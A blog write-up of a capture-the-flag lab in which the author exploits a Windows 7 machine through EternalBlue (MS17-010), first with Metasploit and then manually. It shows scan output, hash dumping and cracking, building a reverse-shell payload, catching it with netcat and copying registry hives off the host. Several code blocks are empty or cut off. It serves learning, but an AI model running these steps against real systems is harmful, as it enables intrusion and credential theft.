## Introduction

After participating in the Disney Can-You-Hack-It CTF, I've been trying to spend more of my time studying security and offensive penetration testing. My main goal is to balance understanding how to effectively perform an attack with the awesome frameworks out there like metasploit while gaining a better understanding of what this framework is doing under the hood. This post is the first of many that will follow me documenting both the attacks and my methodologies.

## Environment

Both attacks take place in a flat network consisting of my attack host, which is a freshly-booted Kali Linux livecd, and the the target host, a freshly-booted Windows VM that I knew contained 3 flags to capture. No other information is known about the host, like what it's running or its OS version, but I would be lying if I said I didn't assume that this would be an eternalblue attack based off the name.

## Attacking Blue with Metasploit

I started the attack by opening a tmux session and starting meterpreter with `msfdb run` to spin up a postgres instance for persisting scans and recon data.

### Host enumeration

Given that I was investigating a single host, and that I had an unfair suspicion of what kind of attack vector I would be looking for, I started with a default script and service version scan.

```bash
msf5 > db_nmap -sV -sC -Pn 10.10.201.83
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 01:53 UTC

[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 140.63 seconds
```

This initial scan began to confirm my suspicions that this was an eternalblue attack since it looked like the host was a Windows 7 Service Pack 1 machine with SMB available. In addition, this ended up leaking a potential username as the computer's name, which was worth keeping in mind as a potential administrative user going forward. Additionally this pointed out relaxed security setting in the smb service's configuration.

With the information I collected so far, I decided to probe a little further into SMB with an enumaration using nmap's `smb-enum-shares` scripts.

```bash
msf5 > db_nmap --script smb-enum-shares  -p 445 10.10.201.83
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 01:58 UTC

[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
```

This indicated anonymous read access on the IPC share, another piece of evidence pointing to eternalblue as being the attack vector. With this information, I decided I should kick off a quick vuln scan with `nmap` to see if it would infact identify eternalblue. Which it quickly did, as `ms17-010`.

```bash
msf5 > db_nmap --script vuln  -p 445 10.10.201.83

```

I now had a potential attack vector to explore, but I decided to do a quick recap of the services on the host to make sure I didn't miss anything. This was crucial because I had overlooked an open RDP port, which ended up being important later in the attack.

```bash
msf5 > services

```

### Preparing the attack

The first step was to check if there were any exploits available for `ms17-010`

```bash
msf5 > search ms17-010

Matching Modules

Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce
```

Since previous scans pointed to the target OS being windows 7, the second option in the list seemed like a perfect candidate.

```bash

SUCCESS! And it left me with `NT AUTHORITY\SYSTEM` credentials. At this point the machine was mine, but I had to make sure that I had a stable foothold on the machine before proceeding to search for flags.

### Foothold

The first step was making sure my shell on the host was stable. So I checked my pid and looked to see if I could migrate it to something like the print spooler.

```powershell
meterpreter > getpid 
Current pid: 1304
meterpreter > ps

```

Luckily for me it already looked like it was in the injected in the spool service so there was no need to proceed with a migration.

Even though I already knew where this host was running from deploying it, the ps output also established that this host was an EC2 instance via the `ssm-agent`, `LiteAgent` and `Ec2Config` processes. This could have also been observed in the nmap scans via the reverse dns lookup, but I thought it was worth calling out.

Confirmed again with a quick run of the `post/windows/gather/checkvm` module.

```bash
meterpreter > run post/windows/gather/checkvm 

[*] Checking if JON-PC is a Virtual Machine ...
[+] This is a Xen Virtual Machine
```

Finally I grabbed a sysinfo output to confirm a bunch of information that I had already assumed or known.

```powershell
meterpreter > sysinfo

With all this information, I attempted to grab a hashdump to pivot from this shell to a longer-lived user.

```powershell
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

And of course, there is Jon. With our hashes and users, I dumped these credentials into a file and ran `john` against it with Kali's copy of the `rockyou.txt` password list.

```bash
root@kali:~/ctf/blue# john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Created directory: /root/.john

```

With the Jon user's password in hand, I ran the `post/windows/manage/enable_rdp` module and was quickly able to connect as the our Jon admin user.

```bash
meterpreter > run post/windows/manage/enable_rdp

```

### Wrapping up

With a new shell I was able to find each of the 3 flags in fairly standard locations on the C:\ drive.

- C:\flag1.txt flag{access_the_machine}
- C:\Windows\system32\config\flag2.txt flag{sam_database_elevated_access}
- C:\Users\Jon\Documents\flag3.txt flag{admin_documents_can_be_valuable}

## Attacking Blue without Metasploit

Now that I had completed the initial attack, I wanted to retry it without the help of metasploit for sourcing, packing and executing the exploit. This imposed the restriction of not having the meterpreter shell to rely on.

Even though I now understood the attack and the host I decided to run through the motions of host enumeration again. For the sake of brevity, I'll avoid repeating some of the callouts unless there are differences with the first attack.

I started with the same nmap scan, the only difference being that I instead supplied `-oA $ATTACKTARGET` to output the results to the host with the target server's ip as a prefix. This functioned to make up for not having the results automatically persisted in `msfdb`.

```bash

Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
```

Once agaiin, the scans lead to the same conclusion that the host is vulnerable to eternalblue. So the next step was to hop on google and [exploitdb](https://www.exploit-db.com) to start looking for an exploit.

### Preparing the attack

The first result that turned up was an exploit from Sleepya [Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)](https://www.exploit-db.com/exploits/42031), whereas google pointed me to [worawit/MS17-010](https://github.com/worawit/MS17-010/). Upon further inspection, they looked to like the same exploit, but the worawit link provided shellcode that could be used as the basis for a payload.

Looking deeper into the [eternalblue_kshellcode_x64.asm shellcode](https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x64.asm), it looked like the shellcode expected a user payload to be appended to the end of the binary both of which still needed to be prepared.

```asm
userland_start:
userland_start_thread:
    ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)
    xchg rdx, rax   ; rdx is CreateThread address passed from kernel
    xor ecx, ecx    ; lpThreadAttributes = NULL
    push rcx        ; lpThreadId = NULL
    push rcx        ; dwCreationFlags = 0
    mov r9, rcx     ; lpParameter = NULL
    lea r8, [rel userland_payload]  ; lpStartAddr
    mov edx, ecx    ; dwStackSize = 0
    sub rsp, 0x20
    call rax
    add rsp, 0x30
    ret
    
userland_payload:
```

With all this in mind, I then pulled down the python exploit script and shellcode and assembled the latter with nasm as a flat binary. Then I generated an unstaged tcp reverse shell for windows as a payload, also a flat binary, and joined the contents contents into a single `sc_joined.bin` payload. One pointless thing to note is I added an arbitrary nop sled to the payload. This could have been left out.

```bash
root@kali:~/ctf/scans# cd ../
root@kali:~/ctf# mkdir exploits && cd exploits
root@kali:~/ctf/exploits# curl -o 42031.py https://www.exploit-db.com/raw/42031
root@kali:~/ctf/exploits# curl -sO https://raw.githubusercontent.com/worawit/MS17-010/master/shellcode/eternalblue_kshellcode_x64.asm

root@kali:~/ctf/exploits# cat sc_x64_kernel.bin reverse.bin > sc_joined.bin 
```

#### Attacking

To prepare to catch the reverse shell, I started a netcat listener on port 443 in a new terminal. Then I returned to the original to install the single required python dependency `impacket` and kick off the attack.

```bash
root@kali:~# nc -lvnp 443
listening on [any] 443 ...
```

```bash
root@kali:~/ctf/exploits# pip2 install impacket
... 
root@kali:~/ctf/exploits# python2 42031.py $ATTACKTARGET sc_joined.bin 20
shellcode size: 1332
numGroomConn: 20
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```

I switched back to our open netcat process to confirm the success of the attack and was happy to find a Windows shell prompt.

```bash
root@kali:~# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.47.175] from (UNKNOWN) [10.10.87.38] 49170

C:\Windows\system32>
```

### Foothold

Unlike the first attack I knew this windows shell was extremely limited, so my first priority was to try to egress credentials so that I could escalate to a more stable point of access.

```powershell
C:\Windows\system32>net user
net user

User accounts for \\

The first step was identifying the local users and attempting to dump some crucial registers that I could attack offline. While doing this I happened to dump these registry hives to the root of the `C:\` drive which happened to point out the first flag `flag{access_the_machine}`. In hindsight this was probably a poor choice of location as it would be much more likely to be caught here than in other locations.

Now that I had the hives dumped on disk I still needed to figure out how to egress them to my local machine for further attack. This lead me to reference an example from [ropnop's blog](https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb) pointing me towards the impacket-smbserver which comes preinstalled on Kali. I could interact with SMB from the cmd shell with out the need for an interactive shell or any other tools.

```bash
root@kali:~/# mkdir -p ctf/extractor && cd ctf/extractor

```

From the target host I was now able to validate that I could see and connect to the newly started share and promptly copied the hives back to my attack machine.

```powershell

With these credentials now available locally, I could extract the user hashes using `secretsdump` from impacket and perform the same attack with `john` that I had performed before.

## Summary

This experience really hammered in how many of the tedious tasks metasploit handles silently. It deals with, assiting in sourcing and packing an exploit, capturing the outputs of scans, handling setting up listeners and catching shells. Additionally, the value that meterpreter provides in stabalizing a shell, transfering files and pivoting is easy to take for granted until it is no longer available. Despite having to do many of those tasks manually, it was massively educational to be forced to read and understand exploit I had attempted and then pivot with the resources only available on the target's limited shell.
